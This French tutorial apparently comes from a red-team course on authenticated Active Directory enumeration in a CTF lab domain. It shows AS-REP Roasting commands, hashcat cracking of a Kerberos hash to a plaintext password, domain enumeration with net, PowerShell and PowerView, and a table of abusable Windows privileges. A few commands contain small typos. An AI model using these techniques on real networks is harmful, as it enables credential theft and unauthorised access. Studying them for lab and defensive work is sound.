+++
author = "Enzo"
title = "AD - Enumération avec authentification"
date = "2026-03-30"
categories = [
    "Red Team"
]
tags = [
    "Windows",
    "AD",
    "Enumeration",
    "CTF",
    "Cours"
]
+++
# AD : Enumération avec authentification
## AS-REP Roasting
Pour faire de l'AS-REP Roasting nous pouvons utiliser 2 outils : 
- ``Rubeus``
- ``Impacket``

Nous allons voir ces 2 outils. Puis une partie brute-force avec ``hashcat``. 

### Enumération
Avec cette partie de l'exploitation, nous allons voir comment recupérer les mots de passe hashé des comptes qui ont la pré-authéntification de désactivé.
#### Rubeus
Comme vu dans le poste [Attaquer Kerberos](../ad-Attaquer-Kerberos/) nous devons avoir accès à une machine et y avoir le binaire de ``Rubeus`` dessus. 
````Bash
Rubeus.exe asrepsoasting
````

#### Impacket
Tout pareil nous avons vu cette attaque dans le poste [Attaquer Kerberos](../ad-Attack-Kerberos/index.md) j'explique plus précisément les commande là bas.
````Bash
GetNPUsers.py kiron.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User sshd doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User gerald.burgess doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nigel.parsons doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User guy.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jeremy.booth doesn't have UF_DONT_REQUIRE_PREAUTH set
[...]
````
Une fois le(s) hash récupéré, nous pourrons tenter de le(s) cracker/brute-force. 

### Brute-Force
Nous allons tenter de Brute-force le hash récupéré précédemment, pour ça, nous pouvons utiliser la binaire ``hashcat`` : 
````Bash
hashcat -m 18200 hashes.txt /opt/lists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
==========================================================================================================================================
* Device #1: pthread--0x000, 2941/5947 MB (1024 MB allocatable), 10MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 2 MB


Dictionary cache built:
* Filename..: /opt/lists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 0 secs

$krb5asrep$23$asrepuser@KIRON.LOC:bed70468ecb6364309b6405a0d3ba84c$00421aeeb4b3b88dcca6a8f96c92e9e8ab870e757fbc9a8807e3be1324820f5b938cbe15cf708c8ded8d56339ef1ceed4bf8c47ed2154ff765ac45391789aebc926b70f65b27ecaf03c0940d0e4206297fb49e68caa7d43dcd5606a30f4c55ef05e4b78c78a4e7f57cad8e35c477ff49f222da02fe5228ccbab1b1a5574f2ba55c8319c96178bbccc1de2b3cf0dca4d7d323ac92e32d31e5334bcd5e4e8410840416da78441fa675c33cd459c02b9775aae29f6f6ca30f7b4e27fd1f893a037c6eaf87c644f8f8f296224d76ef023d5cad55acfe25ae6bc2070b0288bf47036db3d105e3d618a8785f91352850a5:qwerty123!
````
Ici nous pouvons voir que l'utilisateur ``asrepuser``du domaine ``KIRON.LOC`` à le mot de passe ``qwerty123!``. 

## Enumération manuel
L'énumération manuel peut nous permettre d'avoir énormément d'info sur l'environnement dans lequel nous nous trouvons. Pour cette exemple je vais continuer avec l'utilisateur ``pwn`` : 
### Whoami 
````Powershell
C:\Users\asrepuser1>whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ============================================
kiron\asrepuser S-1-5-21-1966530601-3185510712-10604624-1641


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
[...]
````
Ici une partie qui nous intéresse principalement c'est les PRIVILEGES 
#### Privilèges

| **Privilège**                     | **Description**                                                                                                                                 |
|-----------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------|
| **SeImpersonatePrivilege**        | Permet à un processus d'emprunter l'identité (contexte de sécurité) d'un autre utilisateur après authentification.                              |
| **SeAssignPrimaryTokenPrivilege** | Autorise un processus à assigner le jeton d'accès principal (primary token) d'un autre utilisateur à un nouveau processus.                     |
| **SeBackupPrivilege**             | Permet à un utilisateur de lire n'importe quel fichier sur le système, en ignorant les permissions NTFS.                                       |
| **SeRestorePrivilege**            | Donne le droit d'écrire dans n'importe quel fichier ou clé de registre, en contournant les permissions.                                        |
| **SeDebugPrivilege**              | Permet d'attacher un débogueur à n'importe quel processus, y compris ceux exécutés avec des privilèges élevés (ex. : `lsass.exe`).             |

### Invite de commande
Mise à part cette commande ``whoami`` nous avons pas mal d'autres utilitaires comme ``net`` qui va nous permettre de lister les utilisateurs, groupes, partage de fichier disponible sur le réseau : 
````Powershell
# Connaître les utilisateurs du domaine : 
net user /domain

# Avoir des infos sur un utilisateur précis : 
net user <user> /domain

# Avoir des infos sur les groupes : 
net group /domain

# Avoir des infos sur un groupe précis : 
net group "Tier 1 Admins" /domain

[...]
````
### Powershell
Nous avons le module PowerShell ``ActiveDirectory`` : 
````Powershell
# Installation du module
Import-Module ActiveDirectory

# Enumérer les utilisateurs du domaine
Get-ADUser -Filter * 

# Infos concernant un utilisateur
Get-ADUser -Identity <user>

# Avoir les groupes de l'AD 
Get-ADGroup -Filter * | Select Name

# Avoir les utilisateurs d'un groupe
Get-ADGroupMember -Identity "<group>"

# Avoir les politiques de mots de passe 
Get-ADDefaultDomainPasswordPolicy
````
Avec powershell nous avons un Framework externe pour faciliter l'énumération manuel qui s'appel ``PowerSploit`` : 
````Powershell
# Installation
git clone https://github.com/PowerShellMafia/PowerSploit.git
cd Recon
Import-Module PowerView.ps1

# Utilisation
# Enumération des utilisateurs du domaine
Get-DomainUser

# Chercher un 'type' d'utilisateur par son nom
Get-DomainUser *admin*

# Enumération des groupes du domaine
Get-DomainGroup

# Chercher un 'type' de groupe par son nom
Get-DomainGroup *admin*

# Avoir les PC du domaine
Get-DomainComputer

#####
# Avec ce framework nous pouvons également lister les utilisateurs admins avec : 
Get-DomainUser -AdminCount

# Avoir les comptes contenant un SPN
Get-DomainUser
`````

